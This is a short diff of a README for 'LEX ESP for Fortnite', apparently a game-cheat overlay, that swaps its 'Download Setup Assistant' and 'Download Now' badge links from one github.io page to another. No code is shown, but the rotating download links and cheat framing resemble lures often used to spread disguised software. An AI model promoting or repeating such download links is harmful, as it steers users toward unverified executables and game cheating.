@@ -1,7 +1,7 @@
 # 👁️ LEX ESP for Fortnite — Visual Awareness Overlay
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-blueviolet?style=for-the-badge)](https://lex-esp-for-fortnite.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=fortnite)](https://lex-esp-for-fortnite.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-blueviolet?style=for-the-badge)](https://sevendarimameiz.github.io/.github/lex-for-fortnite)  
+[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=fortnite)](https://sevendarimameiz.github.io/.github/lex-for-fortnite)
 
 ---
                                            (     (( (                  
